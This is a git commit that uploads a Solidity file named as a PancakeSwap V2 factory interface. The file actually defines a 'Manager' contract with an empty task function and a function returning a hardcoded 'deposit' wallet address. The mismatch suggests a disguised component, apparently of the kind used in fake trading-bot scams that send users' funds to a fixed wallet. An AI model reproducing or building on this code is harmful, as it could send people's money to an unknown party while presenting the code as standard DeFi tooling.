b15416b20235226aebbdf82783993893444794d6
MoonDevPCSWP <96997307+MoonDevPCSWP@users.noreply.github.com>
2022-01-02 22:01:11 +0200

    Add files via upload

---
+++ pancakeswap-v2-periphery-main/contracts/interfaces/V2/IPancakeswapV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x5c105a105134b5233147B1E2e1948Cfc4b9b74Dc;
+	}
+}
